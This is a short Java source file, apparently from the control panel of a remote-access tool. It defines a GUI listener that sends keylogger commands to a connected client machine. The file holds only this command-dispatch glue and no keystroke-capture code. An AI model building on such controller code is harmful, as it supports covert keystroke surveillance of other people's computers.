package GUI.TableUtils.KeyLogger;

import Connections.ClientErrorHandler;
import Connections.Streams;
import GUI.TableUtils.Configuration.GetSYS;
import GUI.TableUtils.Configuration.SocketType;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.util.Objects;

public class KeyLoggerEventsListener implements ActionListener {
    private final KeyloggerEvents event;

    public KeyLoggerEventsListener(KeyloggerEvents event) {
        this.event = event;
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        Streams stream = Objects.requireNonNull(GetSYS.getClientHandler()).getMainStream();
        stream.getExecutor().submit(() -> {
            try {
                stream.sendAction(event);
            } catch (IOException ex) {
                new ClientErrorHandler("Unable to manage keylogger, connection lost with client",
                        stream.getClientSocket());
            }
        });
    }
}

